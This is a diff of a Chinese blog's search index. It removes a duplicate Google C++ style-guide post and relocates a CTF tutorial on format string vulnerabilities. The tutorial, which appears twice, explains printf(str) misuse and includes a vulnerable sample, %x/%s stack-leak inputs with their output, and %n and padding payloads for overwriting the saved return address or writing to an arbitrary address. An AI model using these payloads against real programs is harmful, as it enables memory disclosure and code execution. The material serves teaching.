@@ -138,33 +138,6 @@
     
     <entry>
       <title>关于谷歌c++编程规范</title>
-      <link href="/2018/08/11/leetcode/"/>
-      <url>/2018/08/11/leetcode/</url>
-      
-        <content type="html"><![CDATA[<p>良好的命名真的很重要</p><a id="more"></a><h2 id="谷歌命名规范"><a href="#谷歌命名规范" class="headerlink" title="谷歌命名规范"></a>谷歌命名规范</h2><p><strong>一个图片大纲</strong></p><div align="center"><br><img src="google.png" alt="图片大纲"><br></div><p>附上我看见过的最全面的博客</p><p><a href="http://zh-google-styleguide.readthedocs.io/en/latest/google-cpp-styleguide/contents/" target="_blank" rel="noopener">谷歌c++规范</a></p><h2 id="为啥不用匈牙利命名法"><a href="#为啥不用匈牙利命名法" class="headerlink" title="为啥不用匈牙利命名法"></a>为啥不用匈牙利命名法</h2><p>早期坚定拥护匈牙利命名法的Microsoft在 .NET Framework后，已经不再建议程序员使用匈牙利命名法了。</p><p>微软新的变量名称建议General Naming Conventions原文如下：</p><blockquote><p>Donot use Hungarian notation. Hungarian notation isthe practice of including a prefix in identifiers to encode some metadata aboutthe parameter, such as the data type of the identifier.</p></blockquote><p>附上一句很经典的原话：</p><blockquote><p>“避免使用匈牙利记法，它会让你的承诺落空。赘物并非信息，而是混淆耳目的伪信息。”</p></blockquote><h2 id="谷歌规范检查工具"><a href="#谷歌规范检查工具" class="headerlink" title="谷歌规范检查工具"></a>谷歌规范检查工具</h2><p>Cpplint是一个python脚本，Google使用它作为自己的C++代码规范检查工具。如果你所在的公司也使用Google C++代码规范，那么你有必要了解下Cpplint。</p><p> 下面说一下Cpplint在windows下的简单使用：</p><ol><li><p>从<a href="http://google-styleguide.googlecode.com/svn/trunk/cpplint/cpplint.py" target="_blank" rel="noopener">此处</a>下载cpplint.py源码，并将其存放到D:\soft\Cpplint\cpplint.py中；</p></li><li><p>安装python2，并将D:\ProgramFiles\Python27 添加到系统环境变量Path中；</p></li></ol><p>vs用户可以参考<a href="https://www.jianshu.com/p/64aa95820165" target="_blank" rel="noopener">这个博文</a>来进行配置。</p><hr>]]></content>
-      
-      
-      <categories>
-          
-          <category> 从零开始的编程之路 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 编程 </tag>
-            
-            <tag> c++ </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>关于谷歌c++编程规范</title>
       <link href="/2018/08/11/%E5%85%B3%E4%BA%8E%E8%B0%B7%E6%AD%8Cc-%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
       <url>/2018/08/11/%E5%85%B3%E4%BA%8E%E8%B0%B7%E6%AD%8Cc-%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
       
@@ -326,31 +299,6 @@
     
     
     <entry>
-      <title>格式化字符串漏洞</title>
-      <link href="/2018/06/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
-      <url>/2018/06/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
-      
-        <content type="html"><![CDATA[<p>printf家族的格式化漏洞</p><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>格式化字符串漏洞主要出现在printf家族中，当程序员为了偷懒将从用户处读入的字符串直接输出时，可能会触发格式化字符串漏洞，例如以下代码。</p><pre><code>printf(&quot;%s&quot;,str)//这是安全的printf(str)//这是危险的</code></pre><p>虽然说printf的第一个参数一定会输出，但是如果在其中拥有格式字符的话，就会从堆栈中找到一个变量的参数值进行输出，从而输出本不应该输出的内容。</p><h2 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h2><p>以下我将把一段c++代码作为例子解析原理</p><pre><code>#include &lt;iostream&gt;using namespace std;int main(){    char str[100];    cin &gt;&gt; str;    printf(str);    system(&quot;pause&quot;);}</code></pre><p>这段代码就会出现此类bug</p><blockquote><p>%s<br>閴J</p></blockquote><p>其中“閴J”这个奇怪的字符串就是从内存里读出来的<br>假如我们不使用%s这样的目的较纯粹的格式化字符，而是使用%n、%x这样恶意满满的格式化字符就会导致任意写或者堆栈中的东西被泄露出去。</p><h2 id="x查看栈的内容-s查看地址上的内容"><a href="#x查看栈的内容-s查看地址上的内容" class="headerlink" title="%x查看栈的内容%s查看地址上的内容"></a>%x查看栈的内容%s查看地址上的内容</h2><p>内容如下</p><blockquote><p>%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p></blockquote><p>-—-结果—-</p><blockquote><p>11d108211d10825b1000cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc7825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325000000000000(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)</p></blockquote><p>ps.请注意这样子操作访问的地址从高到低（堆栈从低向高利用）一个%x刚好跳过一个地址。</p><h2 id="sprint触发栈溢出"><a href="#sprint触发栈溢出" class="headerlink" title="sprint触发栈溢出"></a>sprint触发栈溢出</h2><p>例如</p><pre><code>char user[]=&quot;%496d\x39\x4a\x42\x00&quot;;char outbuf[512];char buffer[512]sprintf(buffer,&quot;ERR Wrong command：%.400s&quot;,user);</code></pre><blockquote><p>两个16进制表示一个字符，以这种方式将他们捆成整体，这样子会两个16进制会作为一个整体写入而不是作为两个字符写入毕竟我们需要在内存中写入的是00434a39而不是16个16进制。也只有以这种方式才能在内存中写入00434a39</p></blockquote><p>这里有一个小技巧利用%496d，快速向buffer里面丢垃圾这样子就往栈中存放eip的位置写入了“00434a39”</p><blockquote><p>低&emsp; 临时变量3 EBP-xxx<br>↓↓&emsp;  临时变量2 EBP-xxx<br>↓↓&emsp;  临时变量1 EBP-xxx<br>↓↓&emsp;  &lt;——EBP<br>↓↓&emsp; EBP原值<br>↓↓&emsp; EIP原值<br>↓↓&emsp; 参数1<br>↓↓&emsp; 参数2<br>高&emsp; 参数3</p></blockquote><p>调用函数附近的内存情况</p><h2 id="任意内存写"><a href="#任意内存写" class="headerlink" title="任意内存写"></a>任意内存写</h2><p>先通过这样的方式确定那个字符串放在那里<br>输入<br><code>AAAA %08x %08x %08x %08x %08x %08x %08x</code> </p><blockquote><p>\x58\x74\x04\x08%.Md%n<br>形如这样的代码可以在08047458中写入一个M+4<br>大致原理基本如此</p></blockquote><hr><p>pentools 可以很快速的进行此漏洞利用，下次有空补上</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 从零开始的ctf之路 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> pwn </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>unlink</title>
       <link href="/2018/06/14/unlink/"/>
       <url>/2018/06/14/unlink/</url>
@@ -370,6 +318,31 @@
             <tag> pwn </tag>
             
             <tag> 堆 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>格式化字符串漏洞</title>
+      <link href="/2018/06/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2018/06/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<p>printf家族的格式化漏洞</p><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>格式化字符串漏洞主要出现在printf家族中，当程序员为了偷懒将从用户处读入的字符串直接输出时，可能会触发格式化字符串漏洞，例如以下代码。</p><pre><code>printf(&quot;%s&quot;,str)//这是安全的printf(str)//这是危险的</code></pre><p>虽然说printf的第一个参数一定会输出，但是如果在其中拥有格式字符的话，就会从堆栈中找到一个变量的参数值进行输出，从而输出本不应该输出的内容。</p><h2 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h2><p>以下我将把一段c++代码作为例子解析原理</p><pre><code>#include &lt;iostream&gt;using namespace std;int main(){    char str[100];    cin &gt;&gt; str;    printf(str);    system(&quot;pause&quot;);}</code></pre><p>这段代码就会出现此类bug</p><blockquote><p>%s<br>閴J</p></blockquote><p>其中“閴J”这个奇怪的字符串就是从内存里读出来的<br>假如我们不使用%s这样的目的较纯粹的格式化字符，而是使用%n、%x这样恶意满满的格式化字符就会导致任意写或者堆栈中的东西被泄露出去。</p><h2 id="x查看栈的内容-s查看地址上的内容"><a href="#x查看栈的内容-s查看地址上的内容" class="headerlink" title="%x查看栈的内容%s查看地址上的内容"></a>%x查看栈的内容%s查看地址上的内容</h2><p>内容如下</p><blockquote><p>%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p></blockquote><p>-—-结果—-</p><blockquote><p>11d108211d10825b1000cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc7825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325000000000000(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)(null)</p></blockquote><p>ps.请注意这样子操作访问的地址从高到低（堆栈从低向高利用）一个%x刚好跳过一个地址。</p><h2 id="sprint触发栈溢出"><a href="#sprint触发栈溢出" class="headerlink" title="sprint触发栈溢出"></a>sprint触发栈溢出</h2><p>例如</p><pre><code>char user[]=&quot;%496d\x39\x4a\x42\x00&quot;;char outbuf[512];char buffer[512]sprintf(buffer,&quot;ERR Wrong command：%.400s&quot;,user);</code></pre><blockquote><p>两个16进制表示一个字符，以这种方式将他们捆成整体，这样子会两个16进制会作为一个整体写入而不是作为两个字符写入毕竟我们需要在内存中写入的是00434a39而不是16个16进制。也只有以这种方式才能在内存中写入00434a39</p></blockquote><p>这里有一个小技巧利用%496d，快速向buffer里面丢垃圾这样子就往栈中存放eip的位置写入了“00434a39”</p><blockquote><p>低&emsp; 临时变量3 EBP-xxx<br>↓↓&emsp;  临时变量2 EBP-xxx<br>↓↓&emsp;  临时变量1 EBP-xxx<br>↓↓&emsp;  &lt;——EBP<br>↓↓&emsp; EBP原值<br>↓↓&emsp; EIP原值<br>↓↓&emsp; 参数1<br>↓↓&emsp; 参数2<br>高&emsp; 参数3</p></blockquote><p>调用函数附近的内存情况</p><h2 id="任意内存写"><a href="#任意内存写" class="headerlink" title="任意内存写"></a>任意内存写</h2><p>先通过这样的方式确定那个字符串放在那里<br>输入<br><code>AAAA %08x %08x %08x %08x %08x %08x %08x</code> </p><blockquote><p>\x58\x74\x04\x08%.Md%n<br>形如这样的代码可以在08047458中写入一个M+4<br>大致原理基本如此</p></blockquote><hr><p>pentools 可以很快速的进行此漏洞利用，下次有空补上</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 从零开始的ctf之路 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
             
         </tags>
       
